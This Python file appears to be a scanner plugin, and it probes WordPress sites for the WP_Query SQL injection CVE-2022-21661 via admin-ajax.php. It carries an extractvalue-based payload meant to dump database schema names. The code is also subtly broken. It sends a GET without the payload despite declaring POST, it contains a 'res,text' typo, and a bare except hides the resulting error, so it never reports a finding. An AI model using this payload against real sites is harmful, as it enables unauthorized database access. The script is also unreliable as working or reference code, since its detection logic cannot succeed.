#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'WordPress WP_Query SQL 注入漏洞 CVE-2022-21661',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/wp-admin/admin-ajax.php'
  data = '''
action=test&data={"tax_query":[{"field":"term_taxonomy_id","terms":["1) and extractvalue(rand(),concat(0x5e,(select group_concat(schema_name) from information_schema.SCHEMATA)))#"]}]}
  '''
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'XPATH syntax error:.*?',res,text,re.S):
      res.close()
      ret['ifbug'] = True
      ret['url'] = url1
      return ret
    else:
      return ret
  except:
    return ret